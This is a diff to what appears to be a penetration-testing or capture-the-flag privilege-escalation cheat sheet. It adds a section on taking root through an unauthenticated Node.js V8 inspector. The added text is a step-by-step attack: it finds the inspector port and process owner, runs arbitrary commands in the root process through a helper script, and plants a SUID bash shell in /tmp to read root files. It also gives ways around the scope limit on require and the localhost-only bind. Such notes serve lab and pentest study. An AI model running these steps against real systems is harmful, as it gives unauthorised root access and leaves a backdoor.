@@ -378,6 +378,21 @@ Generic wins once you can talk to a service that executes as root:
 - **Writable definition file**: if a config/task file the root service loads is owned/writable by a user you control, edit it to run your command, then trigger a reload/action.
 - **Weak/absent auth**: admin/task runners often default to no authentication on localhost.
 
+### Node.js `--inspect` / V8 Inspector (CDP) as root
+A process started with `--inspect[=host:port]` exposes an **unauthenticated** debugger (Chrome DevTools Protocol over WebSocket). Reaching the port means code execution inside that process — if it runs as root, that's root. Enumerate as in the section above.
+```shell
+ss -ltnp | grep -E ':92(29|30)'             # 9229 = default node inspector port
+ps -eo user,pid,cmd | grep -- '--inspect'   # check the OWNER (root?)
+curl -s http://127.0.0.1:9229/json/list     # webSocketDebuggerUrl, no auth
+```
+`curl` can't drive it (CDP needs WebSocket). Use the stdlib client to run a command in the (root) process, then drop a SUID shell:
+```shell
+python3 tools/nodejs-inspector-cdp/cdp_root.py 'id'
+python3 tools/nodejs-inspector-cdp/cdp_root.py 'cp /bin/bash /tmp/0 && chmod 6755 /tmp/0'
+/tmp/0 -p -c 'id; cat /root/root.txt'
+```
+Notes: `Runtime.evaluate` runs in global scope — use `process.mainModule.require('child_process').execSync(...)` (bare `require` is out of scope). A localhost-only bind is bypassed from any local shell; forward it to use a GUI debugger: `ssh -L 9229:127.0.0.1:9229 user@target` then `chrome://inspect`.
+
 ## Kubernetes
 ### Enumerate pods (kubeletctl)
 Kubeletctl is a command line tool that implement kubelet's API.
